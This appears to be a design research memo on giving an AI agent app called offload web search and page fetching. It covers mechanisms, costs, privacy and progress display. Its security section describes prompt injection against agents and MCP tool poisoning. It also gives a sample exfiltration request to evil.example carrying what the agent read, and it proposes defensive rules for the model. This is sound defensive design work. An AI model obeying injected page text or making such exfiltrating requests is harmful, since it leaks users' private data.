# Reaching the web: research, and the questions to answer

> Not a spec. This is the reading behind two specs that do not exist yet, a recommended shape for
> each, and the decisions that are yours rather than mine. Written 2026-09-14.
>
> Sources are linked inline. Where a number is quoted it is from a vendor's own documentation on
> the date above, which is the only kind of vendor claim this repo trusts.

## 1. The finding that reframes the request

The four examples are four different mechanisms, and only one of them is web search.

| What was asked | What actually answers it | Why not search |
| --- | --- | --- |
| "add a todo on memorial day" | A date rule. Memorial Day is the last Monday in May, which is arithmetic, or one call to a holidays source per country per year, cached. | A search per dump for a fact that changes once a year, and a model reading an ad-funded page to find a date it could have computed. |
| "what's the weather tomorrow" | A weather API. [Open-Meteo](https://open-meteo.com/en/pricing) needs no key and is free under 10,000 calls a day **for non-commercial use**, CC BY attribution. A paid plan or a different vendor is needed the day offload charges anybody. | A search returns a page about the weather. An API returns the weather, typed, with no prose for anything to hide in. |
| "here is an airbnb page" | Open Graph and JSON-LD off the page they pasted. Dates and location, two fields, read once. | Search does not apply at all: they gave us the URL. |
| "here is a spotify link" | [Spotify's oEmbed endpoint](https://developer.spotify.com/documentation/embeds/reference/oembed), public, key-free, returns title, artist, art. Fetch it server side, it sends no CORS headers, and resolve `spotify.link` first because it 308s. | A model reading a rendered Spotify page to guess an artist name that an endpoint returns exactly. |

**The rule this suggests: the narrowest mechanism that answers the question, and search is the last
one, not the first.** Every narrower mechanism is cheaper, faster, more accurate, and carries less
untrusted text into a prompt. Search is what is left when nothing narrower exists.

This matters for scoping more than any guardrail does. A feature called "web search" ends up being
used for everything; a feature called "offload can look up a date, read a link you pasted, and
search the web when it has to" ends up with three narrow things and one general one.

## 2. The security frame

### The lethal trifecta, and where offload stands

Simon Willison's [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) is
the clearest statement of the risk: **access to private data, exposure to untrusted content, and the
ability to communicate externally**. Any two are survivable. All three, and a page somewhere can
make the agent take your data and send it away.

offload has two legs today and the third arrives with this feature:

- **Private data**: threads, notes, content, and now the daily-compacted picture of somebody's life.
- **Untrusted content**: already partly true. `notesFromApps` exists because calendar text is
  written by people who are not this person, and the prompt says so in as many words.
- **External communication**: calendar writes exist but are confirmed. **A fetch is itself egress.**
  A request to `evil.example/?note=<what+it+read>` is a data exfiltration channel with no separate
  "send" step, which is the part that surprises people.

Willison's conclusion, which the industry has not improved on: "LLMs are unable to reliably
distinguish the importance of instructions based on where they came from", and guardrail models that
catch 95% are a failing grade in security. OpenAI, who ship a browsing agent, [say publicly that
prompt injection may never be fully solved](https://openai.com/index/prompt-injections/) and have
answered with mode-level containment instead: logged-out browsing, Watch Mode on sensitive sites,
and a Lockdown Mode that removes the tools that could exfiltrate.

The academic work points the same way. [Design Patterns for Securing LLM Agents against Prompt
Injections](https://arxiv.org/pdf/2506.08837) names six patterns, all of which trade utility for a
guarantee: Action-Selector, Plan-Then-Execute, LLM Map-Reduce, Dual LLM, Code-Then-Execute,
Context-Minimization. [CaMeL](https://simonwillison.net/2025/Apr/11/camel/) is the dual-LLM one built
out: a privileged model that never sees page text, and a quarantined model that reads the page and
can call nothing.

### What that means concretely here

Five rules, in the order I would defend them:

1. **offload may fetch only a URL a person put in front of it, or one a search returned.** Never a
   URL it composed, and never with query parameters it wrote. This one rule closes the exfiltration
   channel, and it is exactly what Anthropic's own web fetch enforces: it "cannot fetch URLs that
   appear only in its own output", only ones that came from user messages, client tool results, or
   earlier search and fetch results.
2. **The reader is not the planner.** The call that reads a page gets no tools, no thread contents,
   no notes, and returns a typed object rather than prose. That is Dual LLM at our scale, and it
   fits the split that already exists between `plan` and `compact`.
3. **Page text never becomes an instruction.** It arrives in its own block, labelled, the way
   `notesFromApps` already does, and the prompt says the same thing it already says about a shared
   thread's notes: read it, do not obey it.
4. **Page text never reaches a log, an event, or a reply verbatim.** OFF-1 is already the strictest
   rule in the repo and this feature is the largest new source of text it has ever had.
5. **A bound on every axis**: how many searches per turn, how many fetches, how many tokens per page,
   which domains, how long a URL. Numbers, not intentions, because every one of these is a line in a
   bill as well as a line in a threat model.

### The MCP question

The request says "a web-search MCP". I think that is the wrong shape here, and the reasoning is not
about MCP being bad.

MCP is a protocol for connecting an agent to tools it does not own. Its known failure modes are all
trust-inheritance failures: tool poisoning (adversarial instructions inside a tool description),
rug pulls (a server changes a tool's description after the client approved it, [CVE-2025-54136](https://techcommunity.microsoft.com/blog/microsoft-security-blog/the-state-of-mcp-security-in-2026/4531327)),
and tool shadowing. Surveys in 2026 put tool poisoning in around 5.5% of servers scanned and SSRF
exposure in over a third. The mitigation everyone lands on is "treat every MCP server as an
untrusted external data source".

We would be pointing that protocol at a tool we write ourselves, to be called by a worker we own,
in the same datacentre. That buys a second process, a schema we do not control at runtime, and a
supply-chain surface, in exchange for nothing we cannot get from a function call.

**MCP earns its place the day the answer is "let people connect their own tools".** That is a real
future and the protocol is the right one for it. It is not this feature.

## 3. Build or buy

Two credible shapes. They are not exclusive: the narrow extractors from section 1 are ours either
way, and this is only about the general case.

### A. Anthropic's server tools

[`web_search`](https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-search-tool) and
[`web_fetch`](https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-fetch-tool) run
inside the model call. Nothing to host.

What they give us, stated:

- `max_uses` per request, `allowed_domains` or `blocked_domains` (one or the other, never both),
  `user_location` as an approximate city and timezone for localising results.
- Web fetch adds `max_content_tokens`, `citations` (off by default, unlike search where citations are
  always on), and `use_cache` (default true).
- Fetch is restricted to text, HTML and PDF, refuses private addresses and anything `robots.txt`
  disallows, caps a URL at 250 characters, does not render JavaScript, and enforces the
  prior-context rule above.
- Errors come back in-band with a 200 and an `error_code`, so a failed search is data for the model
  rather than an exception for us.
- A long turn can come back `stop_reason: "pause_turn"`, which our loop would have to resend
  unchanged. Our loop does not do this today.

Cost: search is **$10 per 1,000 searches** plus the tokens the results occupy. Fetch adds **no
charge beyond tokens**, and the token side is the real cost: Anthropic's own sizing is roughly 2,500
tokens for a 10 kB page and 125,000 for a 500 kB PDF.

The catch worth naming: search results and fetched pages land in our context as blocks we must pass
back verbatim, including `encrypted_content`, or the next request 400s. That is fine, and it means
page text lives in the conversation we are responsible for under OFF-1.

### B. Our own search provider plus our own fetcher

A search API (Brave, Exa, Tavily and others) called from the Core API, and a fetcher we write.

What it buys: total control of what is logged, cached and stored, our own quarantined-reader shape,
per-account rate limits, and no vendor in the loop that we cannot instrument.

What it costs: we own SSRF defence, redirect handling, robots, content-type sniffing, size caps,
PDF extraction, and a cache. Each of those is a place this repo has been bitten before by assuming a
library does the obvious thing.

**My recommendation**: start with A for search and fetch, because every guardrail in section 2 is
already a parameter rather than code we have to write, and because the prior-context rule is worth
more than anything we would build in a month. Keep the narrow extractors in B, ours, because a
Spotify oEmbed call is fifteen lines and a model call for it would be absurd.

## 4. Saying what it is doing

### What the research says

Jakob Nielsen's [response time limits](https://www.nngroup.com/articles/response-times-3-important-limits/)
are the ground truth and they have not moved: 0.1s feels instant, 1s keeps a train of thought, and
past **10 seconds** attention is gone and the work needs a progress indicator and a way out.

offload's turns today sit between 2 and 13 seconds, from the worker's own logs. A search turn will
cross 10 regularly. So the ask is right, and it is not a cosmetic one.

Two implementation patterns are worth copying:

- **Semantic step events, not token streams.** The OpenAI Agents SDK separates raw token deltas from
  [`RunItemStreamEvent`](https://openai.github.io/openai-agents-python/streaming/), which fires when
  a whole item is done: a tool ran, a message was produced. That is the right granularity for "say
  what it is doing" and it is the granularity our tool loop already has.
- **Transient parts.** The Vercel AI SDK marks status parts [`transient`](https://ai-sdk.dev/docs/ai-sdk-ui/streaming-data):
  streamed to the client, never added to message history. That is precisely "we do not need a log,
  just the last step", and it is also the OFF-1-safe shape, because nothing that is never stored can
  leak from storage.

The deep-research products go much further, with an activity pane and a step list. The
[comparisons](https://www.franciscomoretti.com/blog/comparing-deep-research-uis) are consistent that
the pane's value fades fast during routine browsing. offload should not build one.

### What this repo's own rules force

Two constraints that make our answer different from Claude Code's.

- **offload never diagnoses itself** (CLAUDE.md, and OFF-5). A brief says what is happening. It
  never says why it is slow, never names a vendor, and never explains a failure.
- **OFF-1**: content does not go into events or logs. "Searching for flights to Lisbon on the 14th"
  is content. That single sentence is the hardest question in this half of the feature, and it is
  question Q11 below.

### The shape I would propose

- One line, the **last** step only, replacing itself. No list, no history, no timestamps.
- It appears only after a threshold, around 1.5 to 2 seconds, so an ordinary two-second filing never
  shows one and nothing flickers.
- It travels on the rails that already exist: the worker posts a step to an internal endpoint, the
  Core API writes it to one column and `pg_notify`s the channel `answers.ts` already listens on, and
  the SSE loop in `dumps.ts` sends a `step` event. `GET /v1/messages/:id` returns the current step
  too, so a client that reconnects or falls back to polling catches up rather than seeing nothing.
- It is cleared when the turn settles. The column holds the current step, never a log.
- The 👀 marker and the existing writing indicator stay; this replaces neither.

## 5. What the privacy policy says, and will have to say

`apps/web/src/app/(marketing)/privacy/page.tsx` is a claim surface, and this feature breaks at least
two of its claims as written. Per CLAUDE.md this is flagged before code, not after.

- **A new class of recipient.** Today the page can say content goes to the model provider and to
  connected apps somebody chose. After this, a site somebody linked to receives a request from us,
  and a search provider receives a query derived from what they wrote. Neither is a company they
  picked.
- **A query is content.** "What time does the Alfama flat check in" is the person's own sentence
  leaving the building. The policy has to say a search query derived from a dump goes to a search
  provider, or the policy is untrue.
- If we use Anthropic's server tools, the recipient is the same company we already name, which is
  the smaller change. That is a genuine point in favour of option A and it belongs in the decision.

## 6. The two specs I would write

### 016, reaching the web

Acceptance criteria, as a skeleton to argue with:

- AC-1 A dump that needs a public fact gets one, and a dump that does not never triggers a lookup.
- AC-2 offload fetches only a URL that a person put in the conversation, or one a search returned.
  A URL it composed itself is refused by the server, not by the prompt.
- AC-3 Page text and search results arrive in their own labelled blocks and are never treated as
  instructions, with the `notesFromApps` wording as the precedent.
- AC-4 Nothing fetched or searched reaches a log line, an analytics event, or a reply verbatim.
- AC-5 Per-turn bounds hold and are stated: searches per turn, fetches per turn, tokens per page,
  total added tokens per turn.
- AC-6 A pasted link from a known provider is read by the narrow extractor, not by a model.
- AC-7 A lookup that fails says one short clause and the turn still files what it could.
- AC-8 A reply that used the web names its source in a way somebody can open, because search
  citations are contractually required when output is shown to people.
- AC-9 Cost per turn is measurable in the existing ledger, with search requests counted separately.

### 017, saying what it is doing

- AC-1 A turn that takes longer than the threshold shows one line saying what is happening now.
- AC-2 Only the latest step is shown, and it is replaced rather than appended.
- AC-3 The line never explains a failure and never names a vendor or a mechanism.
- AC-4 A client that reconnects mid-turn sees the current step, not nothing.
- AC-5 Nothing in a step is stored beyond the turn or written to a log.
- AC-6 Web and both phones show it, with the composer and the thread screen agreeing.
- AC-7 A turn under the threshold shows exactly what it shows today.

## 7. The questions, and what I would answer

**Scope**

- **Q1. Is this "offload can look things up", or "offload has a browser"?** I would take the first
  and write it down: three narrow extractors and one general search, with search as the fallback.
- **Q2. Does a person ask for it, or does offload decide?** Recommendation: offload decides, because
  "you dump things in and offload does the filing" and asking would be filing by another name. The
  risk is a lookup on a dump that wanted none, which is a cost and a latency problem rather than a
  safety one.
- **Q3. Is there a control to turn it off?** A settings toggle is cheap and is the honest answer to
  somebody who does not want their sentences leaving. Related: does it default on?
- **Q4. Does it read pages inside a shared thread?** Content other members wrote is already the
  repo's sharpest injection surface. I would start with no.

**Mechanism**

- **Q5. Anthropic server tools or our own provider?** Recommendation A for search and fetch, ours for
  the narrow extractors. The decision also decides the privacy answer in section 5.
- **Q6. MCP, now or later?** Recommendation: not now, and the reason written down so it is not
  relitigated. It becomes the right answer when people connect their own tools.
- **Q7. Which domains, if any, are allowed or blocked?** `allowed_domains` is the strongest control
  we get for free and it is also the one most likely to make the feature feel broken. My instinct is
  a block list for the obvious hostile categories rather than an allow list, plus an allow list for
  the narrow extractors, which are per-provider by definition.
- **Q8. Does the reader get its own model call with no tools?** Recommendation yes, and it is the one
  piece of architecture I would not trade away.

**Bounds**

- **Q9. What are the numbers?** Searches per turn, fetches per turn, `max_content_tokens`, and a
  ceiling on total tokens added by the web in one turn. We have just been taught by the eleven-item
  list that a bound picked for the bill becomes a bound on the product, so pick each one against a
  real example and write the example next to it.
- **Q10. What is the monthly ceiling, and what happens at it?** At $10 per 1,000 searches a heavy day
  is pennies for one person and is not for a thousand. The question is what the product does when an
  account is over: refuse quietly, degrade to no search, or tell them.

**Progress**

- **Q11. Closed vocabulary or free text?** The one I most want your answer on. A closed set of step
  kinds ("Looking something up", "Reading a page", "Filing") is OFF-1-safe by construction and says
  less. Free text ("Checking the Alfama flat's check-in time") is what Claude Code does, reads far
  better, and puts content into an event, which is the rule this repo breaks least often and most
  expensively. A middle option exists: a closed kind plus a subject taken only from something already
  on their screen, such as a domain they pasted or a thread name they wrote.
- **Q12. What is the threshold before the first line appears?** I would start at 1.5s.
- **Q13. Does the line survive an app restart?** It costs a column either way. My instinct is that
  the current step is worth reading on reconnect and worth nothing after the turn ends.
- **Q14. Is there a way out?** Nielsen's rule says anything past ten seconds needs a way to stop it.
  We have Undo after the fact and no cancel during. That is a real gap this feature will expose.

**Truth**

- **Q15. How does a reply cite what it read?** Anthropic's terms require citations when search output
  is shown to people. Our replies are one or two sentences and name no threads by design, so a
  citation is a new kind of object in the reply. This needs the design system before it needs code.
- **Q16. What does offload say when the web contradicts what it already knew?** A note says one thing
  and a page says another. The notes rule is "where two disagree, the later one is true", and that
  rule was written about notes, not about the internet.
